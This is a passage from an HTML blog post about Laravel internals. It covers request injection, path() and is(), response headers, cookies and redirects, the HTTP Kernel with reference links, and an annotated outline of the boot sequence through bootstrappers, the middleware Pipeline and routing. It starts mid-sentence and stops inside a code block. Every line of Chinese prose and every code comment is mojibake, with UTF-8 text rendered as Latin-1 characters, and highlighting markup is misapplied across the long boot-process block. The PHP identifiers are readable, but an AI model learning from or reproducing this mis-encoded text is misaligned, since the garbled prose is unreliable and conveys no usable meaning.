è¿›è¡Œä¾èµ–æ³¨å…¥å¹¶é€šè¿‡å¦‚ä¸‹æ–¹å¼å®šä¹‰æ§åˆ¶å™¨æ–¹æ³•æ¥è®¿é—®è·¯ç”±å‚æ•° <code>id</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span>, <span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br></code></pre></div></td></tr></table></figure><p>è¿˜å¯ä»¥åœ¨è·¯ç”±é—­åŒ…ä¸­æ³¨å…¥ <code>Illuminate\Http\Request</code>ï¼Œåœ¨æ‰§è¡Œé—­åŒ…å‡½æ•°çš„æ—¶å€™æœåŠ¡å®¹å™¨ä¼šè‡ªåŠ¨æ³¨å…¥è¾“å…¥è¯·æ±‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;<br>    <br>Route::get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>) </span>&#123;<br>    <span class="hljs-comment">//</span><br>&#125;);<br></code></pre></div></td></tr></table></figure><h4 id="è·å–è¯·æ±‚è·¯å¾„"><a href="#è·å–è¯·æ±‚è·¯å¾„" class="headerlink" title="è·å–è¯·æ±‚è·¯å¾„"></a>è·å–è¯·æ±‚è·¯å¾„</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$path</span> = <span class="hljs-variable">$request</span>-&gt;path(); <span class="hljs-comment">//å¦‚æœè¯·æ±‚URLæ˜¯ http://blog.test/user/1ï¼Œåˆ™ path æ–¹æ³•å°†ä¼šè¿”å› user/1</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$request</span>-&gt;is(<span class="hljs-string">&#x27;user/*&#x27;</span>))&#123;<br>    <span class="hljs-comment">//å¦‚æœè¯·æ±‚URLæ˜¯ http://blog.test/user/1ï¼Œè¯¥æ–¹æ³•ä¼šè¿”å› trueã€‚</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="è·å–è¯·æ±‚-URL"><a href="#è·å–è¯·æ±‚-URL" class="headerlink" title="è·å–è¯·æ±‚ URL"></a>è·å–è¯·æ±‚ URL</h4><h4 id="è·å–è¯·æ±‚æ–¹æ³•"><a href="#è·å–è¯·æ±‚æ–¹æ³•" class="headerlink" title="è·å–è¯·æ±‚æ–¹æ³•"></a>è·å–è¯·æ±‚æ–¹æ³•</h4><h4 id="è·å–è¯·æ±‚è¾“å…¥"><a href="#è·å–è¯·æ±‚è¾“å…¥" class="headerlink" title="è·å–è¯·æ±‚è¾“å…¥"></a>è·å–è¯·æ±‚è¾“å…¥</h4><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><p>ä¸Šè¿°åœ¨æ–‡æ¡£ä¸­éƒ½æ¯”è¾ƒç®€å•æ˜“æ‡‚ç›´æ¥çœ‹å³å¯</p><h2 id="å“åº”"><a href="#å“åº”" class="headerlink" title="å“åº”"></a>å“åº”</h2><p>è¿™å—ä¸»è¦å°±æ˜¯<strong>Response å¯¹è±¡</strong>ï¼Œå…¶ä»–æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„</p><p>è¿”å›ä¸€ä¸ªå®Œæ•´çš„ <code>Response</code> å®ä¾‹å…è®¸ä½ è‡ªå®šä¹‰å“åº”çš„ HTTP çŠ¶æ€ç å’Œå¤´ä¿¡æ¯ã€‚<code>Response</code> å®ä¾‹ç»§æ‰¿è‡ª <code>Symfony\Component\HttpFoundation\Response</code> åŸºç±»ï¼Œè¯¥ç±»æä¾›äº†ä¸€ç³»åˆ—æ–¹æ³•ç”¨äºåˆ›å»º HTTP å“åº”ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;cookie/response&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> response(<span class="hljs-string">&#x27;Hello World&#x27;</span>, <span class="hljs-number">200</span>)<br>        -&gt;header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>); <span class="hljs-comment">//æ·»åŠ å“åº”å¤´</span><br>&#125;);<br><br><span class="hljs-keyword">return</span> response(<span class="hljs-variable">$content</span>)<span class="hljs-comment">//ä½¿ç”¨ withHeaders æ–¹æ³•æ¥æŒ‡å®šå¤´ä¿¡æ¯æ•°ç»„æ·»åŠ åˆ°å“åº”ï¼š</span><br>    -&gt;withHeaders([<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span> =&gt; <span class="hljs-variable">$type</span>,<br>        <span class="hljs-string">&#x27;X-Header-One&#x27;</span> =&gt; <span class="hljs-string">&#x27;Header Value&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Header-Two&#x27;</span> =&gt; <span class="hljs-string">&#x27;Header Value&#x27;</span>,<br>    ]);<br><br><span class="hljs-keyword">return</span> response(<span class="hljs-variable">$content</span>)              <span class="hljs-comment">//æ·»åŠ  Cookie åˆ°å“åº”</span><br>    -&gt;header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-variable">$type</span>)<br>    -&gt;cookie(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-variable">$minutes</span>);<br><br>  åˆ©ç”¨è¾…åŠ©å‡½æ•°redirecté‡å®šå‘<br>Route::get(<span class="hljs-string">&#x27;dashboard&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;home/dashboard&#x27;</span>);<br>&#125;);<br><br>è¿˜æœ‰ä¸€äº›å“åº”ï¼Œè§†å›¾å“åº”ï¼Œæ–‡ä»¶å“åº”ç­‰<br>    <br></code></pre></div></td></tr></table></figure><h2 id="å…³äºè§†å›¾"><a href="#å…³äºè§†å›¾" class="headerlink" title="å…³äºè§†å›¾"></a>å…³äºè§†å›¾</h2><p>è¿™ä¸ªæ¯”è¾ƒæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ä¸œè¥¿ï¼Œè·³è¿‡ã€‚</p><h2 id="å…³äºæ ¸å¿ƒç±»Kernelç±»"><a href="#å…³äºæ ¸å¿ƒç±»Kernelç±»" class="headerlink" title="å…³äºæ ¸å¿ƒç±»Kernelç±»"></a>å…³äºæ ¸å¿ƒç±»Kernelç±»</h2><p>vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php<br>æ˜¯laravelå¤„ç†ç½‘ç»œè¯·æ±‚çš„æœ€æ ¸å¿ƒç±»ï¼Œåœ¨appå®¹å™¨å‡†å¤‡å¥½äº†ä¹‹åï¼Œå°±ä¼šè°ƒç”¨æœ¬ç±»ï¼Œä¹‹åæ‰€æœ‰çš„å¤„ç†éƒ½åœ¨æ­¤ç±»ä¸­ã€‚</p><p>å…·ä½“å‚è€ƒï¼š<a href="https://www.136.la/php/show-9877.html">https://www.136.la/php/show-9877.html</a></p><p>â€‹                    <a href="https://www.136.la/php/show-6124.html">https://www.136.la/php/show-6124.html</a></p><p>â€‹                    <a href="https://www.136.la/php/show-16856.html">https://www.136.la/php/show-16856.html</a></p><p>â€‹                    <a href="https://blog.csdn.net/w13707470416/article/details/84979186?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/w13707470416/article/details/84979186?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242</a></p><p>â€‹                    <a href="https://blog.csdn.net/weixin_33916256/article/details/89063048?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_33916256/article/details/89063048?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a></p><div class="hljs code-wrapper"><pre><code>            https://blog.csdn.net/imbibi/article/details/78542258?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-4&amp;spm=1001.2101.3001.4242</code></pre></div><h2 id="å¯åŠ¨è¿‡ç¨‹"><a href="#å¯åŠ¨è¿‡ç¨‹" class="headerlink" title="å¯åŠ¨è¿‡ç¨‹"></a>å¯åŠ¨è¿‡ç¨‹</h2><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">index.php<br>bootstrap/autoload.php      --&gt; è‡ªåŠ¨åŠ è½½<br>bootstrap/app.php           --&gt; åˆå§‹åŒ–æœåŠ¡å®¹å™¨(æ³¨å†ŒåŸºç¡€çš„æœåŠ¡æä¾›è€…(äº‹ä»¶ã€æ—¥å¿—ã€è·¯ç”±)ã€æ³¨å†Œæ ¸å¿ƒç±»åˆ«å)<br>bootstrap/app.php           --&gt; æ³¨å†Œå…±äº«çš„Kernelå’Œå¼‚å¸¸å¤„ç†å™¨<br>Foundation\\Http\\Kernel.php  --&gt; å¤„ç†è¯·æ±‚å’Œå“åº”<br>index.php                   --&gt; å°†å“åº”ä¿¡æ¯å‘é€åˆ°æµè§ˆå™¨<br>index.php                   --&gt; å¤„ç†ç»§æ‰¿è‡ªTerminableMiddlewareæ¥å£çš„ä¸­é—´ä»¶ï¼ˆSessionï¼‰å¹¶ç»“æŸåº”ç”¨ç”Ÿå‘½å‘¨æœŸ<br><br>å…¶ä¸­å¤„ç†è¯·æ±‚å’Œå“åº”åŒ…æ‹¬ï¼š<br>    è§£æIlluminate\\Contracts\\Http\\Kernelï¼Œå®ä¾‹åŒ–App\\Http\\Kernel<br>    a. å®ä¾‹åŒ–Kernel ï¼š æ„é€ å‡½æ•°ï¼šè®¾ç½®<span class="hljs-variable">$app</span>/<span class="hljs-variable">$router</span>ï¼Œåˆå§‹åŒ–<span class="hljs-variable">$router</span>ä¸­middlewareæ•°å€¼<br>    b. handleå¤„ç†è¯·æ±‚ï¼š<br>        åŠ è½½è·¯ç”±ä¸­é—´ä»¶ã€åŠ è½½ç¯å¢ƒå˜é‡ã€åŠ è½½é…ç½®æ–‡ä»¶ã€åŠ è½½å¼‚å¸¸å¤„ç†æœºåˆ¶ã€æ³¨å†Œé—¨é¢ã€æ³¨å†ŒæœåŠ¡æä¾›è€…ã€å¯åŠ¨æœåŠ¡æä¾›è€…ã€ç®¡é“æ¨¡å¼æ³¨å…¥ä¸­é—´ä»¶<br>    c.å°†å“åº”ä¿¡æ¯å‘é€åˆ°æµè§ˆå™¨<br>        æ³¨å†Œrequestå®ä¾‹åˆ°å®¹å™¨ (<span class="hljs-variable">$app</span>[\<span class="hljs-string">&#x27;request\&#x27;]-&gt;Illuminate\\Http\\Request)  --  $requestæ˜¯ç»è¿‡Symfonyå°è£…çš„è¯·æ±‚å¯¹è±¡</span><br><span class="hljs-string">        æ¸…ç©ºä¹‹å‰å®¹å™¨ä¸­çš„requestå®ä¾‹</span><br><span class="hljs-string">        è°ƒç”¨bootstrapæ–¹æ³•ï¼Œå¯åŠ¨ä¸€ç³»åˆ—å¯åŠ¨ç±»çš„bootstrapæ–¹æ³•ï¼š</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\DetectEnvironment  ç¯å¢ƒé…ç½®ï¼ˆ$app[â€˜envâ€™]ï¼‰</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\LoadConfiguration  åŸºæœ¬é…ç½®ï¼ˆ$app[â€˜configâ€™]ï¼‰</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\ConfigureLogging   æ—¥å¿—æ–‡ä»¶ï¼ˆ$app[â€˜logâ€™]ï¼‰</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\HandleExceptions   é”™è¯¯&amp;å¼‚å¸¸å¤„ç†</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\RegisterFacades    æ¸…é™¤å·²è§£æçš„Facadeå¹¶é‡æ–°å¯åŠ¨ï¼Œæ³¨å†Œconfigæ–‡ä»¶ä¸­aliaså®šä¹‰çš„æ‰€æœ‰Facadeç±»åˆ°å®¹å™¨</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\RegisterProviders  æ³¨å†Œconfigä¸­providerså®šä¹‰çš„æ‰€æœ‰Providersç±»åˆ°å®¹å™¨</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\BootProviders      è°ƒç”¨æ‰€æœ‰å·²æ³¨å†ŒProvidersçš„bootæ–¹æ³•</span><br><span class="hljs-string">        é€šè¿‡Pipelineå‘é€è¯·æ±‚ï¼Œç»è¿‡ä¸­é—´ä»¶ï¼Œå†ç”±è·¯ç”±è½¬å‘ï¼Œæœ€ç»ˆè¿”å›å“åº”</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1.è‡ªåŠ¨åŠ è½½</span><br><span class="hljs-string">    åŒ…æ‹¬å…¨å±€å‡½æ•°çš„åŠ è½½ã€é¡¶çº§å‘½åç©ºé—´æ˜ å°„ã€PSR0ã€PSR4æ ‡å‡†çš„å®ç°</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.åˆå§‹åŒ–æœåŠ¡å®¹å™¨</span><br><span class="hljs-string">    æ³¨å†Œå®¹å™¨æœ¬èº«</span><br><span class="hljs-string">        å°†åŸºæœ¬çš„ç»‘å®šæ³¨å†Œåˆ°å®¹å™¨ä¸­ï¼ŒåŒ…æ‹¬å®¹å™¨è‡ªèº«ã€å®¹å™¨å®ä¾‹åç§°app</span><br><span class="hljs-string">        å®ä¾‹åŒ–</span><br><span class="hljs-string">            app, Illuminate\\Container\\Container</span><br><span class="hljs-string">        å…³é”®ä»£ç ï¼š</span><br><span class="hljs-string">            protected function registerBaseBindings() &#123;</span><br><span class="hljs-string">                static::setInstance($this);</span><br><span class="hljs-string">                $this-&gt;instance(\&#x27;app\&#x27;, $this);</span><br><span class="hljs-string">                $this-&gt;instance(Container::class, $this);</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">    æ³¨å†ŒåŸºç¡€æœåŠ¡æä¾›è€…</span><br><span class="hljs-string">        å‘å®¹å™¨åˆ†åˆ«æ³¨å†Œäº†Keyä¸ºä»¥ä¸‹å€¼å¾—å®ä¾‹</span><br><span class="hljs-string">            events</span><br><span class="hljs-string">            log</span><br><span class="hljs-string">            routerã€urlã€redirectã€Illuminate\\Contracts\\Routing\\ResponseFactory</span><br><span class="hljs-string">        å…³é”®ä»£ç ï¼š</span><br><span class="hljs-string">            protected function registerBaseServiceProviders() &#123;</span><br><span class="hljs-string">                $this-&gt;register(new EventServiceProvider($this));</span><br><span class="hljs-string">                $this-&gt;register(new LogServiceProvider($this));</span><br><span class="hljs-string">                $this-&gt;register(new RoutingServiceProvider($this));</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">    æ³¨å†Œå®¹å™¨åˆ«å(æ³¨å†Œå…±äº«çš„Kernel)</span><br><span class="hljs-string">        åœ¨è°ƒç”¨æ­¤æ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬æƒ³å–å¾—ä¸€ä¸ªå®¹å™¨å®ä¾‹çš„åšæ³•æ˜¯ App::make(\&#x27;app\&#x27;);</span><br><span class="hljs-string">        ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‰ç§æ–¹æ³•æ¥å–å¾—ä¸€ä¸ªå®¹å™¨å®ä¾‹app</span><br><span class="hljs-string">                    App::make(\&#x27;Illuminate\\Foundation\\Application\&#x27;)</span><br><span class="hljs-string">                    App::make(\&#x27;Illuminate\\Contracts\\Container\\Container\&#x27;)</span><br><span class="hljs-string">                    App::make(\&#x27;Illuminate\\Contracts\\Foundation\\Application\&#x27;)</span><br><span class="hljs-string">        å…³é”®ä»£ç ï¼š</span><br><span class="hljs-string">            public function registerCoreContainerAliases()&#123;</span><br><span class="hljs-string">                ...</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">3. æ³¨å†Œå…±äº«çš„Kernelå’Œå¼‚å¸¸å¤„ç†å™¨</span><br><span class="hljs-string">        å…³é”®ä»£ç ï¼š</span><br><span class="hljs-string">            $app-&gt;singleton(</span><br><span class="hljs-string">                Illuminate\\Contracts\\Http\\Kernel::class,</span><br><span class="hljs-string">                App\\Http\\Kernel::class</span><br><span class="hljs-string">            );</span><br><span class="hljs-string"></span><br><span class="hljs-string">            $app-&gt;singleton(</span><br><span class="hljs-string">                Illuminate\\Contracts\\Console\\Kernel::class,</span><br><span class="hljs-string">                App\\Console\\Kernel::class</span><br><span class="hljs-string">            );</span><br><span class="hljs-string"></span><br><span class="hljs-string">            $app-&gt;singleton(</span><br><span class="hljs-string">                Illuminate\\Contracts\\Debug\\ExceptionHandler::class,</span><br><span class="hljs-string">                App\\Exceptions\\Handler::class</span><br><span class="hljs-string">            );</span><br><span class="hljs-string"></span><br><span class="hljs-string">4. å¤„ç†è¯·æ±‚å’Œå“åº”</span><br><span class="hljs-string">        å®ä¾‹åŒ–App\\Http\\Kernel</span><br><span class="hljs-string">        æ„é€ å‡½æ•°ï¼šè®¾ç½®$app/$routerï¼Œåˆå§‹åŒ–$routerä¸­middlewareæ•°å€¼</span><br><span class="hljs-string">        å…³é”®ä»£ç ï¼š</span><br><span class="hljs-string">                public function __construct(Application $app, Router $router)</span><br><span class="hljs-string">                &#123;</span><br><span class="hljs-string">                    $this-&gt;app = $app;</span><br><span class="hljs-string">                    $this-&gt;router = $router;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    $router-&gt;middlewarePriority = $this-&gt;middlewarePriority;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    foreach ($this-&gt;middlewareGroups as $key =&gt; $middleware) &#123;</span><br><span class="hljs-string">                        $router-&gt;middlewareGroup($key, $middleware);</span><br><span class="hljs-string">                    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    foreach ($this-&gt;routeMiddleware as $key =&gt; $middleware) &#123;</span><br><span class="hljs-string">                        $router-&gt;aliasMiddleware($key, $middleware);</span><br><span class="hljs-string">                    &#125;</span><br><span class="hljs-string">                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">5. handleå¤„ç†è¯·æ±‚</span><br><span class="hljs-string">        a. æ³¨å†Œrequestå®ä¾‹åˆ°å®¹å™¨ ($app[\&#x27;request\&#x27;]-&gt;Illuminate\\Http\\Request)  --  $requestæ˜¯ç»è¿‡Symfonyå°è£…çš„è¯·æ±‚å¯¹è±¡</span><br><span class="hljs-string">        b. æ¸…ç©ºä¹‹å‰å®¹å™¨ä¸­çš„requestå®ä¾‹</span><br><span class="hljs-string">        c. è°ƒç”¨bootstrapæ–¹æ³•ï¼Œå¯åŠ¨ä¸€ç³»åˆ—å¯åŠ¨ç±»çš„bootstrapæ–¹æ³•</span><br><span class="hljs-string">        d. é€šè¿‡Pipelineå‘é€è¯·æ±‚ï¼Œç»è¿‡ä¸­é—´ä»¶ï¼Œå†ç”±è·¯ç”±è½¬å‘ï¼Œæœ€ç»ˆè¿”å›å“åº”</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å…³é”®ä»£ç ï¼š</span><br><span class="hljs-string">            protected function sendRequestThroughRouter($request)</span><br><span class="hljs-string">            &#123;</span><br><span class="hljs-string">                $this-&gt;app-&gt;instance(\&#x27;request\&#x27;, $request);</span><br><span class="hljs-string"></span><br><span class="hljs-string">                Facade::clearResolvedInstance(\&#x27;request\&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">                $this-&gt;bootstrap();</span><br><span class="hljs-string"></span><br><span class="hljs-string">                return (new Pipeline($this-&gt;app))</span><br><span class="hljs-string">                            -&gt;send($request)</span><br><span class="hljs-string">                            -&gt;through($this-&gt;app-&gt;shouldSkipMiddleware() ? [] : $this-&gt;middleware)</span><br><span class="hljs-string">                            -&gt;then($this-&gt;dispatchToRouter());</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">6. bootstrapæ–¹æ³•</span><br><span class="hljs-string">        a.æ£€æµ‹ç¯å¢ƒå˜é‡æ–‡ä»¶æ˜¯å¦æ­£å¸¸</span><br><span class="hljs-string">        b.å–å¾—é…ç½®æ–‡ä»¶ï¼Œå³æŠŠ/config/ä¸‹çš„æ‰€æœ‰é…ç½®æ–‡ä»¶è¯»å–åˆ°å®¹å™¨ï¼ˆapp()-&gt;make(\&#x27;config\&#x27;)å¯ä»¥æŸ¥çœ‹æ‰€æœ‰é…ç½®ä¿¡æ¯ï¼‰</span><br><span class="hljs-string">        c.æ³¨å†Œå¼‚å¸¸ï¼š set_error_handler,set_exception_handler, register_shutdown_function</span><br><span class="hljs-string">        d.æŠŠ/config/app.phpé‡Œé¢çš„aliasesé¡¹åˆ©ç”¨PHPåº“å‡½æ•°class_aliasåˆ›å»ºåˆ«åï¼Œä»æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨App::make(\&#x27;app\&#x27;)æ–¹å¼å–å¾—å®ä¾‹</span><br><span class="hljs-string">        e.æŠŠ/config/app.phpé‡Œé¢çš„providersé¡¹,æ³¨å†Œåˆ°å®¹å™¨</span><br><span class="hljs-string">        f.è¿è¡Œå®¹å™¨ä¸­æ³¨å†Œçš„æ‰€æœ‰çš„ServiceProviderä¸­å¾—bootæ–¹æ³•</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å…³é”®ä»£ç ï¼š</span><br><span class="hljs-string">            protected $bootstrappers = [</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\LoadEnvironmentVariables::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\LoadConfiguration::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\HandleExceptions::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\RegisterFacades::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\RegisterProviders::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\BootProviders::class,</span><br><span class="hljs-string">            ];</span><br><span class="hljs-string"></span><br><span class="hljs-string">7. å°†å“åº”ä¿¡æ¯å‘é€åˆ°æµè§ˆå™¨</span><br><span class="hljs-string">        å…³é”®ä»£ç ï¼š</span><br><span class="hljs-string">            $response-&gt;send();</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">9. å¤„ç†ç»§æ‰¿è‡ªTerminableMiddleware</span><br><span class="hljs-string">        å…³é”®ä»£ç ï¼š</span><br><span class="hljs-string">            $kernel-&gt;terminate($request, $response);</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">10. Laravelè·¯ç”±</span><br><span class="hljs-string">    $this-&gt;dispatchToRouter()</span><br><span class="hljs-string">    --&gt; $this-&gt;router-&gt;dispatch($request)</span><br><span class="hljs-string">    --&gt; $this-&gt;dispatchToRoute($request);  -- /Illuminate/Routing/Router.php</span><br><span class="hljs-string">    --&gt; $response = $this-&gt;runRouteWithinStack($route, $request);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    //å¹²è´§æ¥äº†</span><br><span class="hljs-string">    protected function runRouteWithinStack(Route $route, Request $request)</span><br><span class="hljs-string">    &#123;</span><br><span class="hljs-string">        // å–å¾—routes.phpé‡Œé¢çš„MiddlewareèŠ‚ç‚¹</span><br><span class="hljs-string">        $middleware = $this-&gt;gatherRouteMiddlewares($route);</span><br><span class="hljs-string">        //è¿™ä¸ªæœ‰ç‚¹çœ¼ç†Ÿ</span><br><span class="hljs-string">        return (new Pipeline($this-&gt;container))</span><br><span class="hljs-string">                -&gt;send($request)</span><br><span class="hljs-string">                -&gt;through($middleware)    //æ‰§è¡Œä¸Šè¿°çš„ä¸­é—´ä»¶</span><br><span class="hljs-string">                -&gt;then(function($request) use ($route)</span><br><span class="hljs-string">                &#123;</span><br><span class="hljs-string">                    //ä¸å®¹æ˜“å•Šï¼Œç»ˆäºåˆ°Controllerç±»äº†</span><br><span 